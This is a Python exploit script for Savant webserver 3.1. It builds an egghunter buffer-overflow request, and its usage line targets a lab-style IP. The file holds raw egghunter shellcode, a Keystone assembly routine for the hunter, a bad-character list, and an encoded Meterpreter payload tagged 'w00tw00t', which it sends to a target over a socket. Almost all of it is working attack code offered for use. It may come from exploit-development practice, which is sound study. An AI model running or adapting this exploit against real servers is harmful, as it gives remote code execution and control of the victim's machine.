
#!/usr/bin/python3

#payload written by Ajay Justin
#Savant webserver 3.1 Egghunter based Exploit

from keystone import *
import socket
import sys

def gen_payload():


        egg_hunter = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x37\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7"

        http_head = b"\x31\xC0\x85\xC0\x0F\x84\x11" + b" /"
        input_buffer = b"\x41"*(253 - len(egg_hunter))
        input_buffer += b"\x74\x86\x41"
        http_end = b"\r\n\r\n"

        shell = gen_shellcode()

        buffer = http_head + egg_hunter + input_buffer + http_end + shell

        print("[+]Total len of payload {}".format(len(input_buffer)))
        return buffer
def gen_shellcode():
        badchar = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

        #meterpreter payload
        payload =  b""
        payload += b"\xda\xca\xd9\x74\x24\xf4\xb8\xfa\x87\x97\x18"
        payload += b"\x5b\x31\xc9\xb1\x59\x83\xeb\xfc\x31\x43\x15"
        payload += b"\x03\x43\x15\x18\x72\x6b\xf0\x53\x7d\x94\x01"
        payload += b"\x0b\x4f\x46\x88\x2e\xcb\xed\xd9\x80\x9f\xa0"
        payload += b"\xd1\x6b\xcd\x50\xe5\xdc\xb8\x7e\x72\x50\x15"
        payload += b"\x4e\x7b\xa5\xa5\x1c\xbf\xa4\x59\x5f\xec\x06"
        payload += b"\x63\x90\xe1\x47\xa4\x66\x8f\xa8\x78\xf2\x3d"
        payload += b"\x26\x2a\x8f\x80\x7a\xd5\x5f\x8f\xc2\xad\xda"
        payload += b"\x50\xb6\x01\xe4\x80\xbd\xd2\xfe\x70\x4a\xba"
        payload += b"\xde\x71\x9f\xbe\xd6\x06\x23\x88\x63\xd2\xd0"
        payload += b"\x0b\xa2\x2a\x19\x3a\x8a\xe1\x24\xf2\x07\xfb"
        payload += b"\x61\x35\xf8\x8e\x99\x45\x85\x88\x5a\x37\x51"
        payload += b"\x1c\x7c\x9f\x12\x86\x58\x21\xf6\x51\x2b\x2d"
        payload += b"\xb3\x16\x73\x32\x42\xfa\x08\x4e\xcf\xfd\xde"
        payload += b"\xc6\x8b\xd9\xfa\x83\x48\x43\x5b\x6e\x3e\x7c"
        payload += b"\xbb\xd6\x9f\xd8\xb0\xf5\xf6\x5d\x39\x06\xf7"
        payload += b"\x03\xad\xca\x3a\xbc\x2d\x45\x4c\xcf\x1f\xca"
        payload += b"\xe6\x47\x13\x83\x20\x9f\x22\x83\xd2\x4f\x8c"
        payload += b"\xc4\x2c\x70\xec\xcd\xea\x24\xbc\x65\xda\x44"
        payload += b"\x57\x76\xe3\x90\xcd\x7c\x73\xdb\xb9\xb9\xe6"
        payload += b"\xb3\xbb\xb9\xe9\xf8\x32\x5f\xb9\xae\x14\xf0"
        payload += b"\x7a\x1f\xd4\xa0\x12\x75\xdb\x9f\x03\x76\x36"
        payload += b"\x88\xae\x99\xee\xe0\x46\x03\xab\x7b\xf6\xcc"
        payload += b"\x66\x06\x38\x46\x82\xf6\xf7\xaf\xe7\xe4\xe0"
        payload += b"\xd7\x07\xf5\xf0\x7d\x07\x9f\xf4\xd7\x50\x37"
        payload += b"\xf7\x0e\x96\x98\x08\x65\xa5\xdf\xf7\xf8\x9f"
        payload += b"\x94\xce\x6e\x9f\xc2\x2e\x7f\x1f\x13\x79\x15"
        payload += b"\x1f\x7b\xdd\x4d\x4c\x9e\x22\x58\xe1\x33\xb7"
        payload += b"\x63\x53\xe7\x10\x0c\x59\xde\x57\x93\xa2\x35"
        payload += b"\xe4\xd4\x5c\xcb\xc3\x7c\x34\x33\x54\x7d\xc4"
        payload += b"\x59\x54\x2d\xac\x96\x7b\xc2\x1c\x56\x56\x8b"
        payload += b"\x34\xdd\x37\x79\xa5\xe2\x1d\xdf\x7b\xe2\x92"
        payload += b"\xc4\x8c\x99\xdb\xfb\x6d\x5e\xf2\x9f\x6e\x5e"
        payload += b"\xfa\xa1\x53\x88\xc3\xd7\x92\x08\x70\xe7\xa1"
        payload += b"\x2d\xd1\x62\xc9\x62\x21\xa7"

        shellcode = b"w00tw00t" + payload+ b"\x90"*(400 - len(payload))
        return shellcode


def gen_asm():

        CODE = (
        "                                       "
        "       loop_inc_page:;                 "
        #loading last memory page into dx register
        "               or dx,0x0fff;           "
        #incremnting edx
        "       loop_inc_one:;                  "
        "               inc edx;                "
        #checking loop
        "       loop_check:;                    "
        #pushing memory addres on to the stack
        "               push edx;               "
        #pushing system call in stack
        "               push 0x2;               "
        #loading 0x2 system call using pop eax ; eax has 0x2
        "               pop eax;                "
        #system interupt call for systemtm interupt
        "               int 0x2e;               "
        #compare 0xc0000005 error checking the value of 5
        "               cmp al,0x5;             "
        "               pop edx;                "
        "       loop_check_valid:;              "
        "               je loop_inc_page;       "
        #moving w00t value in eax
        "               mov eax,0x74303077;     "
        #moving edx pointing to memory address in edi
        "               mov edi,edx;            "
        #compare eax and edi using scasd
        "               scasd;                  "
        "               jnz loop_inc_one;       "
        #second matck in memory
        "               scasd;                  "
        "               jnz loop_inc_one;       "
        #finall step
        "       matched:;                       "
        #addres is founded the it jmp to edi pointing to memory address
        "               jmp edi;                "
)


        KS = Ks(KS_ARCH_X86,KS_MODE_32)
        encode,count = KS.asm(CODE)
        inst = ""

        for dec in encode:
                inst += "\\x{0:02x}".format(int(dec))
        return inst

def main(server,port):
        print("[+]Initializing socket")
        conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        conn.connect((server,80))
        payload = gen_payload()
        conn.send(payload)
        print("[+]Payload has sended to {} on port {}".format(server,port))
        conn.close()

if len(sys.argv) != 3:
        print("usage: ./{} 192.168.56.102 80".format(sys.argv[0]))
else:
        main(sys.argv[1],sys.argv[2])
